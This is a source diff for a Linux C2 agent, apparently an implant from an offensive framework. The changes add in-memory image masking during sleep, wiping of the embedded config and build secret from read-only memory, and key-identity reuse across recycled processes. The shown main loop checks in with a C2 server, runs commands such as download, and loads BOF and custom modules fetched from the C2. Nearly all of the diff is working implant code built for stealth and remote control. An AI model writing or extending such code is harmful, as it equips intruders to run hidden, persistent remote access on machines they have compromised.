@@ -22,12 +22,20 @@
 #include "protocol.h"
 
 #include "agent_args.h"
+#include "agent_identity.h"
+#include "stager_iface.h"
 
+#ifndef C2_AGENT_ENABLE_BOF
+#define C2_AGENT_ENABLE_BOF 1
+#endif
+
+#if C2_AGENT_ENABLE_BOF
 #include "bof.h"
+#include "module.h"
+#endif
 #include "embedded_config.h"
 #include "gzip.h"
 #include "memfile.h"
-#include "module.h"
 #include "sysinfo.h"
 
 #include "cbor_util.h"
@@ -38,6 +46,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdint.h>
+#include <sys/mman.h>
 #include <sys/stat.h>
 #include <sys/utsname.h>
 #include <time.h>
@@ -65,6 +75,25 @@ __attribute__((weak)) const uint8_t c2_magic_string[] = {0};
 __attribute__((weak)) const size_t c2_magic_string_len = 0;
 __attribute__((weak)) const char c2_build_version[] = "N/A";
 
+/* Drop a const build-time blob once its contents are no longer needed. The
+ * page is briefly writable and immediately returned to read-only; this never
+ * touches executable code. */
+static void wipe_rodata(const void *ptr, size_t len) {
+  if (ptr == NULL || len == 0)
+    return;
+  long page = sysconf(_SC_PAGESIZE);
+  if (page <= 0)
+    return;
+  uintptr_t addr = (uintptr_t)ptr;
+  uintptr_t start = addr & ~((uintptr_t)page - 1);
+  uintptr_t end = (addr + len + (uintptr_t)page - 1) & ~((uintptr_t)page - 1);
+  if (mprotect((void *)start, (size_t)(end - start),
+               PROT_READ | PROT_WRITE) != 0)
+    return;
+  memset((void *)ptr, 0, len);
+  (void)mprotect((void *)start, (size_t)(end - start), PROT_READ);
+}
+
 /* ------------------------------------------------------------------------- */
 /* Output buffer + builtin commands */
 /* ------------------------------------------------------------------------- */
@@ -91,7 +120,20 @@ static void obuf_append(obuf *b, const char *s, size_t n) {
   b->p[b->len] = '\0';
 }
 
-static void sleep_secs(unsigned secs) {
+/*
+ * Idle between C2 lifecycles. The stager owns the mask and publishes its entry
+ * point beside the agent; the call runs on this thread after the image has been
+ * made writable and XORed. If no mask stub was installed, a supervising parent
+ * can reclaim the process instead. The agent has no worker threads of its own;
+ * any future worker must be joined before this point, because nothing may run
+ * agent code while the image is masked.
+ */
+static void agent_sleep(const c2_agent_config *cfg, unsigned secs) {
+  if (cfg->is_run_by_stager && c2_stager_masked_sleep(secs) == 0)
+    return;
+  /* No in-place masker: a supervising parent reclaims the process instead. */
+  if (cfg->is_run_by_stager && c2_agent_identity_supervisor_present())
+    exit(0);
   struct timespec ts = {(time_t)secs, 0};
   nanosleep(&ts, NULL);
 }
@@ -368,6 +410,7 @@ static void run_download(c2_agent_session *s, c2_memfile *mem, const char *name,
               st == C2_OK ? 11 : 16);
 }
 
+#if C2_AGENT_ENABLE_BOF
 /* BOF loader dependency name, cached in memfs and fetched from the C2 on the
  * www route as <name>.<arch>.gz when absent (the Linux analogue of the Windows
  * COFFLoader DLL dependency). */
@@ -642,6 +685,8 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
   free(obj);
 }
 
+#endif
+
 static void dispatch(const c2_msgtun *m, c2_agent_session *s, c2_memfile *mem,
                      obuf *out) {
   if (m->cmd_slice.count == 0)
@@ -706,10 +751,12 @@ static void dispatch(const c2_msgtun *m, c2_agent_session *s, c2_memfile *mem,
     run_mem_ls(mem, out);
   } else if (cmd_eq(name, "download")) {
     run_download(s, mem, arg, out);
+#if C2_AGENT_ENABLE_BOF
   } else if (cmd_eq(name, "custom_module")) {
     run_custom_module(s, mem, &m->cmd_slice, out);
   } else if (cmd_eq(name, "bof")) {
     run_bof(s, mem, &m->cmd_slice, out);
+#endif
   } else {
     obuf_append(out, "unsupported command\n", 20);
   }
@@ -741,6 +788,7 @@ __attribute__((visibility("default"))) int main(void) {
     return 1;
   }
   TRACE("[agent] config decrypted: %zu bytes\n", plain_len);
+  wipe_rodata(c2_embedded_config, c2_embedded_config_len);
 
   c2_agent_config cfg;
   memset(&cfg, 0, sizeof(cfg));
@@ -755,17 +803,43 @@ __attribute__((visibility("default"))) int main(void) {
     return 1;
   }
   cfg.magic_string = magic;
+  /* The stager maps a mask entry point beside the agent; read it before the
+   * first idle sleep so the existing sleep cycle can mask in place. */
+  if (cfg.is_run_by_stager)
+    (void)c2_stager_mask_bind();
   TRACE("[agent] cfg host=%.*s http_port=%.*s mode=%.*s\n",
         (int)cfg.cc_address.len, cfg.cc_address.ptr, (int)cfg.cc_http_port.len,
         cfg.cc_http_port.ptr, (int)cfg.c2_channel_mode.len,
         cfg.c2_channel_mode.ptr);
 
+  /* A supervising stager caches the identity scalar across recycled children:
+   * the C2 pins the public key at first check-in and rejects a changed key. */
+  uint8_t restored_priv[C2_AGENT_KEY_LEN];
+  uint8_t restored_pub[C2_P256_PUB_BYTES];
+  int have_restored = 0;
+  if (cfg.is_run_by_stager && c2_agent_identity_supervisor_present()) {
+    int r = c2_agent_identity_import(be, restored_priv, restored_pub);
+    if (r > 0)
+      have_restored = 1;
+  }
+
   c2_transport transport = c2_transport_create(&cfg);
   c2_agent_session s;
-  if ((st = c2_session_init(&s, be, transport, &cfg, NULL)) != C2_OK) {
+  if ((st = c2_session_init(&s, be, transport, &cfg,
+                            have_restored ? restored_priv : NULL)) != C2_OK) {
     TRACE("[agent] session init failed: %d\n", st);
     return 1;
   }
+  if (have_restored)
+    c2_session_set_identity_pub(&s, restored_pub);
+  if (cfg.is_run_by_stager)
+    c2_agent_identity_export(s.agent_priv);
+  c2_secure_zero(restored_priv, sizeof(restored_priv));
+  c2_secure_zero(restored_pub, sizeof(restored_pub));
+  /* The PSK is derived in c2_session_init; the build secret is not needed
+   * after this point. */
+  wipe_rodata(c2_magic_string, c2_magic_string_len);
+  cfg.magic_string = c2_str_of(NULL, 0);
   TRACE("[agent] session init ok\n");
 
   /* In-memory file cache (memfs): entries are gzip-compressed and
@@ -790,7 +864,7 @@ __attribute__((visibility("default"))) int main(void) {
   for (;;) {
     if ((st = c2_session_checkin(&s, &info)) != C2_OK) {
       TRACE("[agent] checkin failed: %d\n", st);
-      sleep_secs(5);
+      agent_sleep(&cfg, 5);
       continue;
     }
     TRACE("[agent] checkin ok\n");
@@ -801,13 +875,13 @@ __attribute__((visibility("default"))) int main(void) {
     if ((st = c2_session_open_route(&s, cfg.routes.msg, c2_str_lit(""),
                                     &msg_caps, &msg)) != C2_OK) {
       TRACE("[agent] msg route open failed: %d\n", st);
-      sleep_secs(5);
+      agent_sleep(&cfg, 5);
       continue;
     }
     if ((st = c2_session_hello(&s, &msg, 1)) != C2_OK) {
       TRACE("[agent] hello failed: %d\n", st);
       c2_secureconn_close(&msg);
-      sleep_secs(5);
+      agent_sleep(&cfg, 5);
       continue;
     }
     TRACE("[agent] hello sent\n");
@@ -840,6 +914,6 @@ __attribute__((visibility("default"))) int main(void) {
 
     c2_secureconn_close(&msg);
     TRACE("[agent] tunnel closed, reconnecting\n");
-    sleep_secs(1);
+    agent_sleep(&cfg, 1);
   }
 }
